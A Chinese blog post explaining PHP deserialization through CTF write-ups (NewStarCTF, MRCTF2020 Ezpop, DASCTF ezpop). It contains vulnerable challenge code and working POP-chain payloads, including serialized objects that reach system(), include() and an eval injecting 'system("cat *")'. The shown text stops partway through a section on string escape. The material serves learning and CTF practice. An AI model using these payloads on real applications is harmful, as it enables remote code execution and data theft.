<!DOCTYPE html>
<html lang="en">
<style>
    p{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
        font-size: 1.1rem;
    }
    figure{
        margin: 0 !important;
    }
    pre{
        padding: 0 !important;
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }

    td{
        padding: 0 !important;
        margin-bottom: 1rem !important;
    }
    h1,h2,h3,h4,h5,h6{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0 - PHP反序列化&amp;SESSION反序列化</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/tailwind.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-tomorrow.min.css">

<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
    <div class="container mx-auto flex items-center justify-between space-x-8">
    
      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
        <a href="/" class="hover:text-white transition-colors select-none">
          Zer0
        </a>
      </h1>
  
    <!-- 大屏幕 -->
      <nav class="hidden md:block">
        <ul class="flex space-x-6">
          
            <li>
              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Home
              </a>
            </li>
          
            <li>
              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Archives
              </a>
            </li>
          
            <li>
              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                About
              </a>
            </li>
          
            <li>
              <a href="/link" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Friends
              </a>
            </li>
          
        </ul>
      </nav>
  
      <!-- 小屏幕 -->
      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>
  
    <!-- 折叠菜单 -->
    <nav id="mobile-menu" class="hidden bg-black">
      <ul class="space-y-2 py-4 px-6">
        
          <li>
            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
              Home
            </a>
          </li>
        
          <li>
            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
              Archives
            </a>
          </li>
        
          <li>
            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
              About
            </a>
          </li>
        
          <li>
            <a href="/link" class="block text-white hover:text-hacker-color1 transition-colors">
              Friends
            </a>
          </li>
        
      </ul>
    </nav>
  
    <!-- RSS Link -->
    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
  </header>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="/js/search.js"></script>
  <script>
        document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.getElementById("menu-toggle");
    const mobileMenu = document.getElementById("mobile-menu");

    menuToggle.addEventListener("click", () => {
        if (mobileMenu.classList.contains("hidden")) {
        mobileMenu.classList.remove("hidden");
        } else {
        mobileMenu.classList.add("hidden");
        }
    });
    });

  </script>
  

<meta name="generator" content="Hexo 7.2.0"></head>
<body class="bg-black text-hacker-color3 container mx-auto">
    <!-- 文章标题 -->
    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">PHP反序列化&amp;SESSION反序列化</h1>

    <!-- 发布时间 -->
    <p class="text-hacker-color3 text-center text-sm mb-4">
        2024-07-16
    </p>

    <!-- 文章内容 -->
    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight">
        <h1 id="PHP反序列化-SESSION反序列化"><a href="#PHP反序列化-SESSION反序列化" class="headerlink" title="PHP反序列化&amp;SESSION反序列化"></a>PHP反序列化&amp;SESSION反序列化</h1><h2 id="PHP反序列化基本概念"><a href="#PHP反序列化基本概念" class="headerlink" title="PHP反序列化基本概念"></a>PHP反序列化基本概念</h2><p>php序列化就是将一个对象，进行变换成一个字符串，这个字符串就是一个个键值对，方便传输数据，那反序列化，就是把它翻过来，从一个个键值对再转换成一个对象。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ooo&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-number">18</span>;<br>&#125;<br><span class="hljs-variable">$t</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$t</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br>输出：  <br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ooo&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">18</span>;&#125;<br><br>解释：<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>;：表示这是一个对象（Object），类名是test，类名长度为<span class="hljs-number">4</span>，包含<span class="hljs-number">2</span>个属性。<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ooo&quot;</span>;：第一个属性是字符串类型（String），属性名为name，长度为<span class="hljs-number">4</span>，对应的值为字符串ooo，长度为<span class="hljs-number">3</span>。<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">18</span>;：第二个属性也是字符串类型（String），属性名为age，长度为<span class="hljs-number">3</span>，对应的值为整数（Integer）<span class="hljs-number">18</span>。<br>综上所述，这段代码表示一个类名为test的对象，它有两个属性：name（值为<span class="hljs-string">&quot;ooo&quot;</span>）和age（值为<span class="hljs-number">18</span>）。<br></code></pre></td></tr></table></figure>

<h2 id="PHP反序列化的几个必知魔术方法"><a href="#PHP反序列化的几个必知魔术方法" class="headerlink" title="PHP反序列化的几个必知魔术方法"></a><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/377676274">PHP反序列化的几个必知魔术方法</a></h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()，类的构造函数,在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。<br><br><span class="hljs-title function_ invoke__">__destruct</span>()，类的析构函数,在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。<br><br><span class="hljs-title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时,<span class="hljs-title function_ invoke__">__call</span>() 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。<br><br><span class="hljs-title function_ invoke__">__callStatic</span>()，在静态上下文中调用一个不可访问方法时，<span class="hljs-title function_ invoke__">__callStatic</span>() 会被调用。<br><br><span class="hljs-title function_ invoke__">__get</span>()，读取不可访问属性的值时，<span class="hljs-title function_ invoke__">__get</span>() 会被调用。__get魔术方法需要一个参数，这个参数代表着访问不存在的属性值。<br><br><span class="hljs-title function_ invoke__">__set</span>()，给不可访问属性赋值时，<span class="hljs-title function_ invoke__">__set</span>() 会被调用。<br><br><span class="hljs-title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()时调用,该魔术方法使用了<span class="hljs-keyword">isset</span>()或者<span class="hljs-keyword">empty</span>()只要属性是<span class="hljs-keyword">private</span>或者不存在的都会触发。<br><br><span class="hljs-title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="hljs-keyword">unset</span>()时被调用。如果一个类定义了魔术方法 <span class="hljs-title function_ invoke__">__unset</span>() ，那么我们就可以使用 <span class="hljs-keyword">unset</span>() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。<br><br><span class="hljs-title function_ invoke__">__sleep</span>()，执行<span class="hljs-title function_ invoke__">serialize</span>()时，先会调用这个函数<br><br><span class="hljs-title function_ invoke__">__wakeup</span>()，执行<span class="hljs-title function_ invoke__">unserialize</span>()时，先会调用这个函数<br><br><span class="hljs-title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法<br><br><span class="hljs-title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><br><span class="hljs-title function_ invoke__">__set_state</span>()，调用<span class="hljs-title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。<br><br><span class="hljs-title function_ invoke__">__clone</span>()，当使用 <span class="hljs-keyword">clone</span> 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <span class="hljs-title function_ invoke__">__clone</span>() ，如果该魔术方法存在的话。<br><br><span class="hljs-title function_ invoke__">__autoload</span>()，尝试加载未定义的类<br><br><span class="hljs-title function_ invoke__">__debugInfo</span>()，打印所需调试信息<br><br></code></pre></td></tr></table></figure>

<h3 id="小试牛刀—–-NewStarCTF-2023-公开赛道-Unserialize？"><a href="#小试牛刀—–-NewStarCTF-2023-公开赛道-Unserialize？" class="headerlink" title="小试牛刀—–[NewStarCTF 2023 公开赛道]Unserialize？"></a>小试牛刀—–[NewStarCTF 2023 公开赛道]Unserialize？</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br><br>payload:<br>POST:unser=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">35</span>:<span class="hljs-string">&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="PHP的POP链"><a href="#PHP的POP链" class="headerlink" title="PHP的POP链"></a>PHP的POP链</h2><p>按我自己的理解，PHP的pop链就是通过改变对象的属性，改变对象的元素的属性，去触发相应的魔术方法，来进行一个链式反应，以此来达到我们的目的。</p>
<h3 id="示例-触发tostring方法，进行链式反应"><a href="#示例-触发tostring方法，进行链式反应" class="headerlink" title="示例(触发tostring方法，进行链式反应)"></a>示例(触发tostring方法，进行链式反应)</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;x;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$o</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag&#123;this_is_flag&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-variable">$b1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">b</span>();<br><span class="hljs-variable">$a1</span>-&gt;x=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">b</span>();<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a1</span>);<br><span class="hljs-meta">?&gt;</span><br><br>D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php<br><br><span class="hljs-number">111</span>flag&#123;this_is_flag&#125;<br>Process finished with <span class="hljs-keyword">exit</span> code <span class="hljs-number">0</span><br><span class="hljs-comment">//这就是一个简单的链式反应</span><br></code></pre></td></tr></table></figure>

<h3 id="小试牛刀—–-MRCTF2020-Ezpop"><a href="#小试牛刀—–-MRCTF2020-Ezpop" class="headerlink" title="小试牛刀—–[MRCTF2020]Ezpop"></a>小试牛刀—–[MRCTF2020]Ezpop</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><br><br>paylod：<br><span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <span class="hljs-comment">//创建show对象</span><br><span class="hljs-variable">$s</span>-&gt;source=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();  <span class="hljs-comment">//将source属性赋为一个新的show对象，触发tostring函数</span><br><span class="hljs-variable">$s</span>-&gt;source-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();	 <span class="hljs-comment">//给$a-&gt;source-&gt;str创建test对象，则$a-&gt;source-&gt;str-&gt;source属性不存在，执行__get函数</span><br><span class="hljs-variable">$s</span>-&gt;source-&gt;str-&gt;p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<span class="hljs-comment">//将Modifier对象赋给p属性，一个链子就此完成。</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>));<br></code></pre></td></tr></table></figure>

<h2 id="2022DASCTF-X-SU-三月春季挑战赛-ezpop"><a href="#2022DASCTF-X-SU-三月春季挑战赛-ezpop" class="headerlink" title="[2022DASCTF X SU 三月春季挑战赛]ezpop"></a>[2022DASCTF X SU 三月春季挑战赛]ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">crow</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">v1</span>(<span class="hljs-variable">$this</span>-&gt;v2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;v1-&gt;<span class="hljs-title function_ invoke__">world</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;f1 . <span class="hljs-string">&#x27;114514&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;f1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;f1-&gt;<span class="hljs-title function_ invoke__">get_flag</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">what</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">run</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mix</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$m1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;m1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;m1);<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fin</span>();<br><span class="hljs-variable">$a</span>-&gt;f1=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">what</span>();<br><span class="hljs-variable">$a</span>-&gt;f1-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mix</span>();<br><span class="hljs-variable">$a</span>-&gt;f1-&gt;a-&gt;m1=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">crow</span>();<br><span class="hljs-variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fin</span>();<br><span class="hljs-variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mix</span>();<br><span class="hljs-variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1=<span class="hljs-string">&#x27;?&gt;&lt;?php system(&quot;cat *&quot;)?&gt;&#x27;</span>;<span class="hljs-comment">//这题太狗了，把flag放在注释里，还得cat *才能看到。</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<h2 id="PHP的字符串逃逸"><a href="#PHP的字符串逃逸" class="headerlink" title="PHP的字符串逃逸"></a>PHP的字符串逃逸</h2><p>字符串逃逸就是通过改变字符串的长度来改变键值对，让键值对改变成我们想要的样子，这个就跟php的特性有关了</p>
<h3 id="PHP的特性"><a href="#PHP的特性" class="headerlink" title="PHP的特性"></a>PHP的特性</h3><h4 id="1、序列化后，底层代码是以-作为字段的分隔，以-作为结尾-字符串除外-，所以-在后面的是没有任何影响的"><a href="#1、序列化后，底层代码是以-作为字段的分隔，以-作为结尾-字符串除外-，所以-在后面的是没有任何影响的" class="headerlink" title="1、序列化后，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，所以}在后面的是没有任何影响的"></a>1、序列化后，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，所以}在后面的是没有任何影响的</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">s</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br>D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;<br>Process finished with <span class="hljs-keyword">exit</span> code <span class="hljs-number">0</span><br>此时，如果变成O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;<span class="hljs-number">54656156135</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;54656156135&#x27;</span>));<br>&#123;<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;b&quot;</span><br>&#125;<br>丝毫没有影响正常的反序列化<br></code></pre></td></tr></table></figure>

